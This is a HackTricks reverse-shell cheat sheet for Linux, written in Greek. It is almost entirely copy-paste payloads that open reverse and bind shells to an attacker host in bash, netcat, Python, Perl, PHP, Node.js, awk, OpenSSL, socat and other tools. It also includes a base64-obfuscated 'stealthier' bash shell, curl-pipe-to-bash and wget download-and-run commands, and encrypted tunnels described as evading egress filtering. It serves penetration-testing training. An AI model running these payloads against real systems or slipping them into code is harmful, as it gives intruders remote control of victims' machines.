# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**Αν έχετε ερωτήσεις σχετικά με κάποιο από αυτά τα shells, μπορείτε να τα ελέγξετε στο** [**https://explainshell.com/**](https://explainshell.com)

## Full TTY

**Μόλις αποκτήσετε ένα reverse shell**[ **διαβάστε αυτήν τη σελίδα για να αποκτήσετε ένα full TTY**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Μην ξεχάσετε να ελέγξετε και άλλα shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Επεξήγηση Shell

1. **`bash -i`**: Αυτό το τμήμα της εντολής ξεκινά ένα interactive (`-i`) Bash shell.
2. **`>&`**: Αυτό το τμήμα της εντολής είναι μια συντομογραφία για την **ανακατεύθυνση τόσο της standard output** (`stdout`) όσο και της **standard error** (`stderr`) στον **ίδιο προορισμό**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Αυτό είναι ένα ειδικό αρχείο που **αντιπροσωπεύει μια TCP σύνδεση προς τη συγκεκριμένη IP address και port**.
- Με την **ανακατεύθυνση των output και error streams σε αυτό το αρχείο**, η εντολή στέλνει ουσιαστικά το output της interactive shell session στο μηχάνημα του attacker.
4. **`0>&1`**: Αυτό το τμήμα της εντολής **ανακατευθύνει τη standard input** (`stdin`) **στον ίδιο προορισμό με τη standard output** (`stdout`).

### Δημιουργία σε αρχείο και εκτέλεση
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Όταν αντιμετωπίζετε μια ευπάθεια **Remote Code Execution (RCE)** σε μια web εφαρμογή που βασίζεται σε Linux, η επίτευξη ενός reverse shell ενδέχεται να παρεμποδίζεται από network defenses, όπως κανόνες iptables ή περίπλοκους μηχανισμούς packet filtering. Σε τέτοια περιορισμένα περιβάλλοντα, μια εναλλακτική προσέγγιση είναι η δημιουργία ενός PTY (Pseudo Terminal) shell, ώστε να αλληλεπιδράτε πιο αποτελεσματικά με το compromised σύστημα.

Ένα προτεινόμενο εργαλείο για αυτόν τον σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το target environment.

Για να χρησιμοποιήσετε αποτελεσματικά το toboggan, δημιουργήστε ένα Python module προσαρμοσμένο στο context του RCE του target system. Για παράδειγμα, ένα module με όνομα `nix.py` θα μπορούσε να έχει την ακόλουθη δομή:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
Και έπειτα, μπορείτε να εκτελέσετε:
```shell
toboggan -m nix.py -i
```
Για να αξιοποιήσεις απευθείας ένα interactive shell. Μπορείς να προσθέσεις το `-b` για integration με το Burpsuite και να αφαιρέσεις το `-i` για ένα πιο βασικό rce wrapper.

Μια άλλη δυνατότητα είναι να χρησιμοποιήσεις το forward shell implementation του `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).

Απλώς χρειάζεται να τροποποιήσεις:

- Το URL του vulnerable host
- Το prefix και το suffix του payload σου (αν υπάρχουν)
- Τον τρόπο αποστολής του payload (headers; data; extra info;)

Έπειτα, μπορείς απλώς να **στείλεις commands** ή ακόμη και να **χρησιμοποιήσεις το `upgrade` command** για να αποκτήσεις ένα πλήρες PTY (σημείωσε ότι τα pipes διαβάζονται και γράφονται με κατά προσέγγιση καθυστέρηση 1,3 δευτερολέπτων).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

Πολύ συνηθισμένο σε **routers**, **embedded devices**, **containers** και stripped-down Linux appliances. Αν δεν υπάρχει αυτόνομο `nc`, ελέγξτε αν το BusyBox το εκθέτει:<sup>[[8]](#references)</sup>
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
Εάν υπάρχει το `busybox nc` αλλά η διαδραστική εκτέλεση είναι ασταθής, το μοτίβο FIFO από την ενότητα `nc` συνήθως εξακολουθεί να λειτουργεί:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

Ελέγξτε το στο [https://www.gsocket.io/deploy/](/https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Επιτιθέμενος**
```bash
while true; do nc -l <port>; done
```
Για να στείλετε την εντολή, γράψτε την, πατήστε enter και πατήστε CTRL+D (για να σταματήσετε το STDIN)<sup>[[3]](#references)</sup>

**Θύμα**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (ενσωματωμένο TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – σύγχρονο listener τύπου netcat γραμμένο σε Rust (περιλαμβάνεται στο Kali από το 2024).<sup>[[5]](#references)</sup>
```bash
# Attacker – interactive TLS listener with history & tab-completion
rcat listen -ib 55600

# Victim – download static binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
Χαρακτηριστικά:
- Προαιρετικό flag `--ssl` για κρυπτογραφημένη μεταφορά (TLS 1.3)
- `-s` για την εκτέλεση οποιουδήποτε binary (π.χ. `/bin/sh`, `python3`) στο victim
- `--up` για αυτόματη αναβάθμιση σε πλήρως διαδραστικό PTY

## pwncat-cs

Αν έχετε ήδη **οποιοδήποτε raw reverse shell**, αλλά θέλετε έναν listener που προσπαθεί αυτόματα να το αναβαθμίσει σε πιο εύχρηστο session, το `pwncat-cs` αποτελεί μια καλή σύγχρονη αντικατάσταση ενός απλού listener `nc -lvnp`.<sup>[[7]](#references)</sup>
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
Υποστηρίζει επίσης **κρυπτογραφημένα** κανάλια `ssl-bind` και `ssl-connect`, ώστε να μπορείτε να τα συνδυάσετε με payloads `ncat --ssl` ή `socat OPENSSL:` όταν χρειάζεστε κρυπτογράφηση μεταφοράς.<sup>[[7]](#references)</sup>

## revsh (κρυπτογραφημένο και έτοιμο για pivot)

Το `revsh` είναι ένας μικρός client/server σε C που παρέχει πλήρες TTY μέσω ενός **κρυπτογραφημένου tunnel Diffie-Hellman** και μπορεί προαιρετικά να συνδέσει ένα interface **TUN/TAP** για reverse VPN-like pivoting.<sup>[[6]](#references)</sup>
```bash
# Build (or grab a pre-compiled binary from the releases page)
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443 with a pinned certificate
revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem

# Victim – reverse shell over TLS to the attacker
./revsh <ATTACKER-IP>:443
```
Χρήσιμα flags:
- `-b` : bind-shell αντί για reverse
- `-p socks5://127.0.0.1:9050` : proxy μέσω TOR/HTTP/SOCKS
- `-t` : δημιουργία interface TUN (reverse VPN)

Επειδή ολόκληρη η session είναι encrypted και multiplexed, συχνά παρακάμπτει απλό egress filtering που θα τερμάτιζε ένα plain-text `/dev/tcp` shell.

## OpenSSL

Ένα **single-port encrypted reverse shell** είναι συνήθως πιο πρακτικό από το κλασικό μοτίβο με δύο listeners, επειδή είναι ευκολότερο να περάσει μέσω του `443` και απλούστερο να αυτοματοποιηθεί.

Ο Attacker (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
Το Θύμα
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
Μπορείτε ακόμα να χρησιμοποιήσετε το κλασικό pattern **two-listener** όταν θέλετε ξεχωριστά κανάλια εισόδου/εξόδου:
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Εισβολέας**
```bash
while true; do nc -l 79; done
```
Για να στείλετε την εντολή, γράψτε την, πατήστε Enter και πατήστε CTRL+D (για να σταματήσετε το STDIN)<sup>[[3]](#references)</sup>

**Θύμα**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Αυτό θα προσπαθήσει να συνδεθεί στο σύστημά σας στη θύρα 6001:
```bash
xterm -display 10.0.0.1:1
```
Για να λάβετε το reverse shell, μπορείτε να χρησιμοποιήσετε το (το οποίο θα ακούει στη θύρα 6001):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

από [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ΣΗΜΕΙΩΣΗ: Το Java reverse shell λειτουργεί επίσης για Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Αναφορές

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Using Whois and Finger for Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - The modern port listener and reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - A reverse shell with terminal support, data tunneling, and advanced pivoting capabilities](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation platform](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)

{{#include ../../banners/hacktricks-training.md}}
